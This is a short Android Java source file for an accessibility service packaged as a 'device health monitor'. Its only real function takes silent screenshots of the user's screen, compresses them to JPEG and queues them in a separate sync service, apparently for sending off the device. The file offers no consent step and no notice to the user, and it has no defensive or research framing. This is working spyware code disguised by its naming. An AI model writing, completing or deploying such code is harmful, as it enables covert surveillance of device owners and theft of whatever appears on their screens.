package com.device.health.monitor;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executors;

public class MonitorService extends AccessibilityService {

    private static volatile MonitorService instance;

    public static MonitorService getInstance() { return instance; }

    @Override
    protected void onServiceConnected() { instance = this; }

    @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
    @Override public void onInterrupt() {}

    @Override
    public void onDestroy() { instance = null; super.onDestroy(); }

    void snap() {
        if (Build.VERSION.SDK_INT < 30) return;
        try {
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY,
                Executors.newSingleThreadExecutor(),
                new AccessibilityService.TakeScreenshotCallback() {
                    @Override
                    public void onSuccess(ScreenshotResult r) {
                        try {
                            Bitmap bmp = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), null);
                            if (bmp != null) {
                                ByteArrayOutputStream out = new ByteArrayOutputStream();
                                bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
                                SyncService.pendingShot = out.toByteArray();
                                bmp.recycle();
                            }
                            r.getHardwareBuffer().close();
                        } catch (Exception e) { Log.d(SyncService.TAG, e.getMessage()); }
                    }
                    @Override public void onFailure(int code) {}
                });
        } catch (Exception e) { Log.d(SyncService.TAG, e.getMessage()); }
    }
}
